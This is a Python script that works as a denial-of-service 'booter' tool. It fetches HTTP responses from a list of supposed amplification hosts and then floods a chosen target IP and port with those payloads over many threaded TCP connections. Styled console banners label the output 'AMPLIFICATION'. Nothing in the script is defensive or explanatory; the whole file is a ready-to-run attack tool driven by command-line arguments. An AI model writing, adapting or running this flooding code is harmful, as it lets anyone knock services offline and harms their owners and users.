import socket,threading,sys,time
from typing import List, Union

class HumanBytes:
    METRIC_LABELS: List[str] = ["B", "kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB","RB","QB"]
    BINARY_LABELS: List[str] = ["B", "KiB", "MiB", "GiB", "TiB", "PiB", "EiB", "ZiB", "YiB"]
    PRECISION_OFFSETS: List[float] = [0.5, 0.05, 0.005, 0.0005, 0.00005]
    PRECISION_FORMATS: List[str] = ["{}{:.0f} {}", "{}{:.1f} {}", "{}{:.2f} {}", "{}{:.3f} {}", "{}{:.4f} {}", "{}{:.5f} {}"]
    @staticmethod
    def format(num: Union[int, float], metric: bool=False, precision: int=1) -> str:
        assert isinstance(num, (int, float))
        assert isinstance(metric, bool)
        assert isinstance(precision, int) and precision >= 0 and precision <= 3
        unit_labels = HumanBytes.METRIC_LABELS if metric else HumanBytes.BINARY_LABELS
        last_label = unit_labels[-1]
        unit_step = 1000 if metric else 1024
        unit_step_thresh = unit_step - HumanBytes.PRECISION_OFFSETS[precision]
        is_negative = num < 0
        if is_negative:
            num = abs(num)
        for unit in unit_labels:
            if num < unit_step_thresh:
                break
            if unit != last_label:
                num /= unit_step
        return HumanBytes.PRECISION_FORMATS[precision].format("-" if is_negative else "", num, unit)

def requests(ip,port,path):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(f'GET {path} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode())
        d = s.recv(99999999)
        return d
    except Exception as e:print(e); return f'GET {path} HTTP/1.1\nHost: {ip}\n\n\r\r'

def DOS(ip,port,amp,id,booter,times,path):
    raw_amp = amp.split(':')
    try:port = raw_amp[1]
    except:port = 80
    packet = requests(raw_amp[0],int(port),path)
    s = HumanBytes.format(len(packet),True)
    print(f'\x1b[38;5;206mID\x1b[38;5;255m=\x1b[38;5;207m{id} \x1b[38;5;196mFrom \x1b[38;5;197m{amp}{path} \x1b[38;5;198mAmplification\x1b[38;5;255m=\x1b[38;5;199m{s} \x1b[38;5;200mto \x1b[38;5;76m{ip}\x1b[38;5;255m:\x1b[38;5;77m{port} \x1b[38;5;51m[ \x1b[38;5;50mTCP \x1b[38;5;51m]\x1b[0m')
    try:
       for _ in range(times):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_TCP,socket.TCP_FASTOPEN, 255)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.connect((ip,port));s.connect_ex((ip, port))
        for _ in range(booter):
           s.send(packet)
           s.sendall(packet)
    except:pass
    print(f'\x1b[38;5;87mID\x1b[38;5;255m=\x1b[38;5;51m{id} \x1b[38;5;196mAMPLIFICATION \x1b[38;5;197mENDING \x1b[38;5;198m. \x1b[38;5;199m. \x1b[38;5;200m.\x1b[0m')
ip = ''; files = ''
port = 0; booter = 0; times = 0
load = 0
if len(sys.argv) == 6:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    times = int(sys.argv[3])
    booter = int(sys.argv[4])
    files = sys.argv[5]
else:
    print(f'\x1b[38;5;196m{sys.argv[0]} \x1b[38;5;77m<\x1b[38;5;51mIP\x1b[38;5;77m> \x1b[38;5;77m<\x1b[38;5;51mPORT\x1b[38;5;77m> \x1b[38;5;77m<\x1b[38;5;51mTIME\x1b[38;5;77m> \x1b[38;5;77m<\x1b[38;5;51mBOOTER\x1b[38;5;77m> \x1b[38;5;77m<\x1b[38;5;51mLIST\x1b[38;5;77m>\x1b[0m')
    exit()
with open(files,'r') as f:
    id = 0
    t = []
    print("\x1b[38;5;76mL\x1b[38;5;77mo\x1b[38;5;78ma\x1b[38;5;79md\x1b[38;5;80mi\x1b[38;5;81mn\x1b[38;5;117mg \x1b[38;5;196mAMPLIFICATION . . .\x1b[0m")
    time.sleep(1)
    amp = []
    for a in f.readlines():
        ip_amp = a.replace('\n','').replace('\r','').split(' ')
        if ip_amp[0] not in amp:
            if load == 1:sys.stdout.write(f"\r\x1b[0;m\x1b[38;5;196m{ip_amp} \x1b[38;5;76mL\x1b[38;5;77mo\x1b[38;5;78ma\x1b[38;5;79md\x1b[38;5;80mi\x1b[38;5;81mn\x1b[38;5;117mg \x1b[38;5;51m--> \x1b[38;5;111m{len(amp)}\033[K\x1b[0m"); sys.stdout.flush(); time.sleep(0.1)
            try:
             amp.append(f'{ip_amp[0]} {ip_amp[1]}')
            except:
             amp.append(f'{ip_amp[0]} /')
    if load == 1:print('\n')
    for ip_amp in amp:
      raw = ip_amp.split(' ')
      if raw[0] != '':
       id += 1
       th = threading.Thread(target=DOS,args=(ip,port,raw[0],id,booter,times,raw[1]))
       t.append(th)
       th.start()
    for t2 in t:
        t2.join()
    print(f"\x1b[38;5;76mTOTAL\x1b[38;5;255m=\x1b[38;5;77m{id} \x1b[38;5;196mAMPLIFICATION \x1b[38;5;197mENDING \x1b[38;5;198m. \x1b[38;5;199m. \x1b[38;5;200m.\x1b[0m")
    exit()
